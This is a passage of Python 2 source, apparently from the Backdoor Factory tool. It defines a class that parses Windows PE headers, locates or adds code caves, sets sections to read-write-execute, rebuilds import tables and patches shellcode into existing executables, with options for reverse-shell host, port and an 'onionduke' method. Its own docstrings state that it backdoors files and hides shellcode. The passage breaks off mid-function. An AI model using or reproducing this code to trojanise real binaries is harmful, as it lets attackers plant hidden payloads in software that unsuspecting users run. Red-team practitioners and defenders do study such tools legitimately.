'''
Copyright (c) 2013-2015, Joshua Pitts
All rights reserved.

Redistribution and use in source and binary forms, with or without modification,
are permitted provided that the following conditions are met:

    1. Redistributions of source code must retain the above copyright notice,
    this list of conditions and the following disclaimer.

    2. Redistributions in binary form must reproduce the above copyright notice,
    this list of conditions and the following disclaimer in the documentation
    and/or other materials provided with the distribution.

    3. Neither the name of the copyright holder nor the names of its contributors
    may be used to endorse or promote products derived from this software without
    specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
POSSIBILITY OF SUCH DAMAGE.

'''

import sys
import os
import struct
import shutil
import platform
import stat
import time
import subprocess
import pefile
import operator
import cStringIO
import random
import string
import re
from random import choice
from winapi import winapi
from intel.intelCore import intelCore
from intel.intelmodules import eat_code_caves
from intel.WinIntelPE32 import winI32_shellcode
from intel.WinIntelPE64 import winI64_shellcode
from onionduke import onionduke
from onionduke.onionduke import write_rsrc
from onionduke.onionduke import xor_file


MachineTypes = {'0x0': 'AnyMachineType',
                '0x1d3': 'Matsushita AM33',
                '0x8664': 'x64',
                '0x1c0': 'ARM LE',
                '0x1c4': 'ARMv7',
                '0xaa64': 'ARMv8 x64',
                '0xebc': 'EFIByteCode',
                '0x14c': 'Intel x86',
                '0x200': 'Intel Itanium',
                '0x9041': 'M32R',
                '0x266': 'MIPS16',
                '0x366': 'MIPS w/FPU',
                '0x466': 'MIPS16 w/FPU',
                '0x1f0': 'PowerPC LE',
                '0x1f1': 'PowerPC w/FP',
                '0x166': 'MIPS LE',
                '0x1a2': 'Hitachi SH3',
                '0x1a3': 'Hitachi SH3 DSP',
                '0x1a6': 'Hitachi SH4',
                '0x1a8': 'Hitachi SH5',
                '0x1c2': 'ARM or Thumb -interworking',
                '0x169': 'MIPS little-endian WCE v2'
                }

#What is supported:
supported_types = ['Intel x86', 'x64']


class pebin():
    """
    This is the pe binary class.  PE files get fed in, stuff is checked, and patching happens.
    """
    def __init__(self, FILE, OUTPUT, SHELL, NSECTION='sdata', DISK_OFFSET=0, ADD_SECTION=False,
                 CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None,
                 INJECTOR=False, CHANGE_ACCESS=True, VERBOSE=False, SUPPORT_CHECK=False,
                 SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False, CAVE_MINER=False,
                 IMAGE_TYPE="ALL", ZERO_CERT=True, RUNAS_ADMIN=False, PATCH_DLL=True, PATCH_METHOD="MANUAL",
                 SUPPLIED_BINARY=None, XP_MODE=False):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.SHELL = SHELL
        self.NSECTION = NSECTION
        self.DISK_OFFSET = DISK_OFFSET
        self.ADD_SECTION = ADD_SECTION
        self.CAVE_JUMPING = CAVE_JUMPING
        self.PORT = PORT
        self.HOST = HOST
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.INJECTOR = INJECTOR
        self.CHANGE_ACCESS = CHANGE_ACCESS
        self.VERBOSE = VERBOSE
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.FIND_CAVES = FIND_CAVES
        self.SUFFIX = SUFFIX
        self.DELETE_ORIGINAL = DELETE_ORIGINAL
        self.CAVE_MINER = CAVE_MINER
        self.IMAGE_TYPE = IMAGE_TYPE
        self.ZERO_CERT = ZERO_CERT
        self.RUNAS_ADMIN = RUNAS_ADMIN
        self.PATCH_DLL = PATCH_DLL
        self.PATCH_METHOD = PATCH_METHOD.lower()
        self.XP_MODE = XP_MODE
        self.flItms = {}
        self.SUPPLIED_BINARY = SUPPLIED_BINARY
        if self.PATCH_METHOD.lower() == 'automatic':
            self.CAVE_JUMPING = True
            self.ADD_SECTION = False
        if self.PATCH_METHOD.lower() == 'replace':
            self.PATCH_DLL = False    

    def run_this(self):
        if self.INJECTOR is True:
            self.injector()
            sys.exit()
        if self.FIND_CAVES is True:
            issupported = self.support_check()
            if issupported is False:
                print self.FILE, "is not supported."
                return False
            print ("Looking for caves with a size of %s bytes (measured as an integer" % self.SHELL_LEN)
            self.find_all_caves()
            return True
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                return False
            try:
                is_supported = self.support_check()
            except Exception, e:
                is_supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if is_supported is False:
                print "%s is not supported." % self.FILE
                return False
            else:
                print "%s is supported." % self.FILE
                return True

        self.output_options()
        return self.patch_pe()

    def gather_file_info_win(self):
        """
        Gathers necessary PE header information to backdoor
        a file and returns a dict of file information called flItms.
        Takes a open file handle of self.binary
        """

        self.binary.seek(int('3C', 16))
        print "[*] Gathering file info"
        self.flItms['filename'] = self.FILE
        self.flItms['buffer'] = 0
        self.flItms['JMPtoCodeAddress'] = 0
        self.flItms['LocOfEntryinCode_Offset'] = self.DISK_OFFSET
        self.flItms['dis_frm_pehdrs_sectble'] = 248
        self.flItms['pe_header_location'] = struct.unpack('<i', self.binary.read(4))[0]
        # Start of COFF
        self.flItms['COFF_Start'] = self.flItms['pe_header_location'] + 4
        self.binary.seek(self.flItms['COFF_Start'])
        self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.VERBOSE is True:
            for mactype, name in MachineTypes.iteritems():
                if int(mactype, 16) == self.flItms['MachineType']:
                        print 'MachineType is:', name
        self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
        self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 16, 0)
        self.flItms['SizeOfOptionalHeader'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Characteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        #End of COFF
        self.flItms['OptionalHeader_start'] = self.flItms['COFF_Start'] + 20

        #if self.flItms['SizeOfOptionalHeader']:
            #Begin Standard Fields section of Optional Header
        self.binary.seek(self.flItms['OptionalHeader_start'])
        self.flItms['Magic'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['MinorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['SizeOfCode'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfInitializedData'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfUninitializedData'] = struct.unpack("<I",
                                                               self.binary.read(4))[0]
        self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['PatchLocation'] = self.flItms['AddressOfEntryPoint']
        self.flItms['BaseOfCode'] = struct.unpack('<I', self.binary.read(4))[0]
        if self.flItms['Magic'] != 0x20B:
            self.flItms['BaseOfData'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Standard Fields section of Optional Header
        # Begin Windows-Specific Fields of Optional Header
        if self.flItms['Magic'] == 0x20B:
            self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]
        else:
            self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'self.flItms[ImageBase]', hex(self.flItms['ImageBase'])
        self.flItms['SectionAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['FileAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',
                                                                   self.binary.read(2))[0]
        self.flItms['MinorOperatingSystemVersion'] = struct.unpack('<H',
                                                                   self.binary.read(2))[0]
        self.flItms['MajorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Win32VersionValue'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfImageLoc'] = self.binary.tell()
        self.flItms['SizeOfImage'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfHeaders'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['CheckSum'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['Subsystem'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['DllCharacteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.flItms['Magic'] == 0x20B:
            self.flItms['SizeOfStackReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<Q', self.binary.read(8))[0]

        else:
            self.flItms['SizeOfStackReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoaderFlags'] = struct.unpack('<I', self.binary.read(4))[0]  # zero
        self.flItms['NumberofRvaAndSizes'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Windows-Specific Fields of Optional Header
        # Begin Data Directories of Optional Header
        self.flItms['ExportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['ExportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['ImportTableLOCInPEOptHdrs'] = self.binary.tell()
        #ImportTable SIZE|LOC
        self.flItms['ImportTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['ImportTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CertTableLOC'] = self.binary.tell()
        self.flItms['CertificateTable'] = struct.unpack('<Q', self.binary.read(8))[0]

        self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Architecture'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['LoadConfigTableRVA'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigTableSize'] = struct.unpack('<I', self.binary.read(4))[0]
        #self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['BoundImportLocation'] = self.binary.tell()
        #print 'BoundImportLocation', hex(self.flItms['BoundImportLocation'])
        self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.binary.seek(self.flItms['BoundImportLocation'])
        self.flItms['BoundImportLOCinCode'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'first IATLOCIN CODE', hex(self.flItms['BoundImportLOCinCode'])
        self.flItms['BoundImportSize'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'BoundImportSize', hex(self.flItms['BoundImportSize'])
        self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['BeginSections'] = self.binary.tell()

        # This could be fixed in the great refactor.
        if self.flItms['NumberOfSections'] is not 0 and 'Section' not in self.flItms:
            self.flItms['Sections'] = []
            for section in range(self.flItms['NumberOfSections']):
                sectionValues = []
                sectionValues.append(self.binary.read(8))
                # VirtualSize
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # VirtualAddress
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # SizeOfRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRelocations
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToLinenumbers
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # NumberOfRelocations
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # NumberOfLinenumbers
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # SectionFlags
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                self.flItms['Sections'].append(sectionValues)
                if 'UPX1'.lower() in sectionValues[0].lower():
                    print "[*] UPX packed, continuing..."

                if ('.text\x00\x00\x00' == sectionValues[0] or
                    'AUTO\x00\x00\x00\x00' == sectionValues[0] or
                    'UPX1\x00\x00\x00\x00' == sectionValues[0] or
                    'CODE\x00\x00\x00\x00' == sectionValues[0]):
                    self.flItms['textSectionName'] = sectionValues[0]
                    self.flItms['textVirtualSize'] = sectionValues[1]
                    self.flItms['textVirtualAddress'] = sectionValues[2]
                    self.flItms['textSizeRawData'] = sectionValues[3]
                    self.flItms['textPointerToRawData'] = sectionValues[4]

                    self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                                       self.flItms['textVirtualAddress'] +
                                                       self.flItms['textPointerToRawData'] +
                                                       self.flItms['LocOfEntryinCode_Offset'])
                elif '.rsrc\x00\x00\x00' == sectionValues[0]:
                    self.flItms['rsrcSectionName'] = sectionValues[0]
                    self.flItms['rsrcVirtualSize'] = sectionValues[1]
                    self.flItms['rsrcVirtualAddress'] = sectionValues[2]
                    self.flItms['rsrcSizeRawData'] = sectionValues[3]
                    self.flItms['rsrcPointerToRawData'] = sectionValues[4]

            # I could add in checks here to support an out of order PE file;
            #  However if here were multiple sections that were RE, RWE, it would be
            #  difficult to get it right in a purposefully mangled binary.
            #  Perhaps if entrypoint is in RE section that is text section? But still.
            #  That could be spoofed and it returns to another RE section.
            if self.PATCH_METHOD != 'onionduke':
                if "textSectionName" not in self.flItms:
                    print "[!] Text section does not have a normal name, not guessing, exiting"
                    print "[!]\tFirst section, text section potential name:", str(self.flItms['Sections'][0][0])
                    return False
            else:
                self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                                   self.flItms['LocOfEntryinCode_Offset'])
            self.flItms['VirtualAddress'] = self.flItms['SizeOfImage']

        else:
            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                               self.flItms['LocOfEntryinCode_Offset'])

        self.flItms['VrtStrtngPnt'] = (self.flItms['AddressOfEntryPoint'] +
                                       self.flItms['ImageBase'])
        self.binary.seek(self.flItms['BoundImportLOCinCode'])
        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['BoundImportSize'])
        self.flItms['NewIATLoc'] = self.flItms['BoundImportLOCinCode'] + 40
        #ParseLoadConfigTable
        for section in reversed(self.flItms['Sections']):
            if self.flItms['LoadConfigTableRVA'] >= section[2]:
                #go to exact export directory location
                self.binary.seek((self.flItms['LoadConfigTableRVA'] - section[2]) + section[4])
                break
        self.flItms['LoadConfigDirectory_Size'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_TimeDataStamp'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_MajorVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['LoadConfigDirectory_MinorVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['LoadConfigDirectory_GFC'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_GFS'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_CSDT'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_DFBT'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_DTFT'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_LPTV'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_MAS'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_VMT'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_PHF'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_PAM'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_CSDV'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['LoadConfigDirectory_Reserved'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['LoadConfigDirectory_ELVA'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_SCVA'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_SEHTVA'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoadConfigDirectory_SEHC'] = struct.unpack('<I', self.binary.read(4))[0]
        if self.flItms['LoadConfigDirectory_Size'] > 0x48:
            #grab CFG info
            self.flItms['LCD_CFG_address_CF_PTR'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['LCD_CFG_Reserved'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['LCD_CFG_Func_Table'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['LCD_CFG_Func_Count'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['LCD_CFG_Guard_Flags'] = struct.unpack('<I', self.binary.read(4))[0]

    def check_apis(self, aFile):
        ####################################
        #### Parse imports via pefile ######

        #make this option only if a IAT based shellcode is selected
        if 'apis_needed' in self.flItms:
            print "[*] Loading PE in pefile"
            pe = pefile.PE(aFile, fast_load=True)
            print "[*] Parsing data directories"
            pe.parse_data_directories()
            self.flItms['neededAPIs'] = set()
            try:
                for api in self.flItms['apis_needed']:
                    apiFound = False
                    for entry in pe.DIRECTORY_ENTRY_IMPORT:
                        for imp in entry.imports:
                            if imp.name is None:
                                continue
                            if imp.name.lower() == api.lower():
                                self.flItms[api + 'Offset'] = imp.address - pe.OPTIONAL_HEADER.ImageBase
                                self.flItms[api] = imp.address
                                apiFound = True
                    if apiFound is False:
                        self.flItms['neededAPIs'].add(api)

                
            except Exception as e:
                print "Exception:", str(e)
            self.flItms['ImportTableFileOffset'] = pe.get_physical_by_rva(self.flItms['ImportTableRVA'])

        #####################################

    def print_flItms(self, flItms):

        keys = self.flItms.keys()
        keys.sort()
        for item in keys:
            if type(self.flItms[item]) == int:
                print item + ':', hex(self.flItms[item])
            elif item == 'Sections':
                print "-" * 50
                for section in self.flItms['Sections']:
                    print "Section Name", section[0]
                    print "Virutal Size", hex(section[1])
                    print "Virtual Address", hex(section[2])
                    print "SizeOfRawData", hex(section[3])
                    print "PointerToRawData", hex(section[4])
                    print "PointerToRelocations", hex(section[5])
                    print "PointerToLinenumbers", hex(section[6])
                    print "NumberOfRelocations", hex(section[7])
                    print "NumberOfLinenumbers", hex(section[8])
                    print "SectionFlags", hex(section[9])
                    print "-" * 50
            else:
                print item + ':', self.flItms[item]
        print "*" * 50, "END flItms"

    def change_section_flags(self, section):
        """
        Changes the user selected section to RWE for successful execution
        """
        print "[*] Changing flags for section:", section
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['BeginSections'], 0)
        for _ in range(self.flItms['NumberOfSections']):
            sec_name = self.binary.read(8)
            if section in sec_name:
                self.binary.seek(28, 1)
                self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
                return
            else:
                self.binary.seek(32, 1)

    def build_imports(self):

        self.flItms['iatdict'] = {}
        self.flItms['thunkSectionSize'] = 0
        self.flItms['lenDLLSection'] = 0
        self.flItms['iatTransition'] = 0
        self.flItms['dllCount'] = 0
        self.flItms['apiCount'] = 0
        #The new section has three areas:
        #DLL names [DLL NAME][0x00] * Number of DLLs
        #thunkSection:
        #DLL1 THunk1: 0x11223344
        #DLL1 Thunk2: 0x11223355 0x00000000
        #DLL2 THunk1: 0x11223366
        #DLL2 Thunk2: 0x11223377 0x00000000
        #repeat thunkSection
        #each address for the thunk points to the API in the next section
        #[0x0000][DLL1 API1 NAME][0x00]
        #[0x0000][DLL1 API2 NAME][0x00]

        for api in self.flItms['neededAPIs']:
            print "[!] Adding %s Thunk in new IAT" % api
            #find DLL
            for aDLL, exports in winapi.winapi.iteritems():
                if aDLL not in self.flItms['iatdict'] and api in exports:
                    self.flItms['lenDLLSection'] += len(aDLL) + 1
                    self.flItms['iatdict'][aDLL] = {api: 0}
                    if self.flItms['Magic'] == 0x20B:
                        self.flItms['thunkSectionSize'] += 16
                    else:
                        self.flItms['thunkSectionSize'] += 8
                    self.flItms['iatTransition'] += 20
                    self.flItms['dllCount'] += 1
                if api in exports:
                    #print aDLL, "has the api", api
                    self.flItms['iatdict'][aDLL][api] = 0
                    if self.flItms['Magic'] == 0x20B:
                        self.flItms['thunkSectionSize'] += 16
                    else:
                        self.flItms['thunkSectionSize'] += 8
                    self.flItms['apiCount'] += 1

        #build first structure

        firstStructure = ''
        dllLen = 0
        sectionCount = 0
        for aDLL, api in self.flItms['iatdict'].iteritems():
            firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +
                                                 (self.flItms['thunkSectionSize'] / 2) +
                                                 self.flItms['BeginningOfNewImports'] + 20 + sectionCount))
            firstStructure += (struct.pack("<Q", 0x000000000))
            firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 +
                                                 self.flItms['BeginningOfNewImports'] + 20 + dllLen))
            firstStructure += struct.pack("<I", (self.flItms['dllCount'] * 20 + self.flItms['lenDLLSection'] +
                                                 self.flItms['BeginningOfNewImports'] + 20 + sectionCount))
            dllLen = len(aDLL) + 1
            sectionCount += 16

        firstStructure += struct.pack("<QQI", 0x0, 0x0, 0x0)
        self.flItms['iatTransition'] = firstStructure

        #build the transition section:
        #For each DLL in the New Import Table
        #   1. 1st Address points to the 2nd Thunk grouping's 1st DLL API Address
        #   2. 8 bytes of 00's
        #   3. Address points to the DLLName
        #   4. Address points to the 1st API thunk address group for the DLL API Address
        #20 bytes of 00's
        # Figure all the size of this structure
        # Work backwards to populate
        #populate thunks

        newDLLSection = ''
        newthunkSection = ''
        newapiNameSection = ''

        apiOffset = (self.flItms['lenDLLSection'] + self.flItms['thunkSectionSize'] +
                     self.flItms['BeginningOfNewImports'] + len(self.flItms['iatTransition']))
        for aDLL, api in self.flItms['iatdict'].iteritems():
            newDLLSection += aDLL + struct.pack("!B", 0x0)
            for apiName, address in api.iteritems():
                newapiNameSection += struct.pack("<H", 0x0) + apiName + struct.pack("<B", 0x0)
                api[apiName] = apiOffset
                if self.flItms['Magic'] == 0x20B:
                    newthunkSection += struct.pack("<Q", apiOffset)
                else:
                    newthunkSection += struct.pack("<I", apiOffset)
                apiOffset += len(apiName) + 3
            if self.flItms['Magic'] == 0x20B:
                newthunkSection += struct.pack("<Q", 0x0)
            else:
                newthunkSection += struct.pack("<I", 0x0)

        newthunkSection += newthunkSection
        self.flItms['addedIAT'] = self.flItms['iatTransition'] + newDLLSection + newthunkSection + newapiNameSection

    def create_new_iat(self):
        """
        Creates new import table for missing imports in a new section
        """
        print "[*] Adding New Section for updated Import Table"

        if "UPX".lower() in self.flItms['textSectionName'].lower():
            print "[!] Cannot patch a new IAT into a UPX binary at this time."
            return False

        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
            self.flItms['NewSectionSize'] = 0x1000
            self.flItms['SectionName'] = 'rdata1'  # less than 7 chars
            #Not the best way to find the new section (update for appending when fix found)
            #newSetionPointerToRawData == last section pointer_to_rawdata and virtualsize
            self.flItms['newSectionPointerToRawData'] = self.flItms['Sections'][-1][3] + self.flItms['Sections'][-1][4]
            self.flItms['VirtualSize'] = self.flItms['NewSectionSize']
            self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
            self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
            self.flItms['newSectionFlags'] = int('C0000040', 16)
            #get file size
            filesize = os.stat(self.flItms['filename']).st_size
            if filesize > self.flItms['SizeOfImage']:
                print "[!] File has extra data after last section, cannot add new section"
                return False
            self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
            self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))
            self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
            self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                             self.flItms['SizeOfImage'])
            self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
            self.binary.seek(self.flItms['BoundImportLocation'])
            if self.flItms['BoundImportLOCinCode'] != 0:
                self.binary.write(struct.pack('<I', self.flItms['BoundImportLOCinCode'] + 40))
            self.binary.seek(self.flItms['BeginSections'] +
                             40 * self.flItms['NumberOfSections'], 0)
            self.binary.write(self.flItms['NewSectionName'] +
                              "\x00" * (8 - len(self.flItms['NewSectionName'])))
            self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))
            self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
            self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
            self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
            if self.VERBOSE is True:
                print 'New Section PointerToRawData:', self.flItms['newSectionPointerToRawData']
            self.binary.write(struct.pack('<I', 0))
            self.binary.write(struct.pack('<I', 0))
            self.binary.write(struct.pack('<I', 0))
            self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
            self.binary.write(self.flItms['ImportTableALL'])

            self.binary.seek(self.flItms['ImportTableFileOffset'], 0)
            #-20 here
            self.flItms['Import_Directory_Table'] = ''
            
            while True:
                check_chars = "\x00" * 20
                read_data = self.binary.read(20)
                if read_data == check_chars:
                    #Found end of import directory
                    break
                self.flItms['Import_Directory_Table'] +=  read_data
                
            #self.flItms['Import_Directory_Table'] = self.binary.read(self.flItms['ImportTableSize'] - 20)
            #print "IDT", self.flItms['Import_Directory_Table'].encode('hex')
            self.binary.seek(self.flItms['newSectionPointerToRawData'], 0)  # moving to end of file
            #test write
            self.binary.write(self.flItms['Import_Directory_Table'])
            #Add new imports
            self.flItms['BeginningOfNewImports'] = self.flItms['SizeOfImage'] + len(self.flItms['Import_Directory_Table'])
            self.build_imports()
            #and remove here
            self.binary.write(self.flItms['addedIAT'])
            self.binary.write(struct.pack("<B", 0x0) * (self.flItms['NewSectionSize'] -
                              len(self.flItms['addedIAT']) - len(self.flItms['Import_Directory_Table']) + 20))
            self.binary.seek(self.flItms['ImportTableLOCInPEOptHdrs'], 0)
            self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
            self.binary.write(struct.pack("<I", (self.flItms['ImportTableSize']) + self.flItms['apiCount'] * 8 + 20))
            self.binary.seek(0)
            #For trimming File of cert (if there)

        #get file data again
        with open(self.flItms['backdoorfile'], 'r+b') as self.binary:
            if self.gather_file_info_win() is False:
                return False

        return True

    def create_code_cave(self):
        """
        This function creates a code cave for shellcode to hide,
        takes in the dict from gather_file_info_win function and
        writes to the file and returns flItms
        """
        print "[*] Creating Code Cave"
        self.flItms['NewSectionSize'] = len(self.flItms['shellcode']) + 250  # bytes
        self.flItms['SectionName'] = self.NSECTION  # less than 7 chars
        self.flItms['filesize'] = os.stat(self.flItms['filename']).st_size
        self.flItms['newSectionPointerToRawData'] = self.flItms['filesize']
        self.flItms['VirtualSize'] = int(str(self.flItms['NewSectionSize']), 16)
        self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
        self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
        self.binary.write(struct.pack('<H', self.flItms['NumberOfSections'] + 1))
        self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
        self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                         self.flItms['SizeOfImage'])
        self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
        self.binary.seek(self.flItms['BoundImportLocation'])
        if self.flItms['BoundImportLOCinCode'] != 0:
            self.binary.write(struct.pack('<I', self.flItms['BoundImportLOCinCode'] + 40))
        self.binary.seek(self.flItms['BeginSections'] +
                         40 * self.flItms['NumberOfSections'], 0)
        self.binary.write(self.flItms['NewSectionName'] +
                          "\x00" * (8 - len(self.flItms['NewSectionName'])))
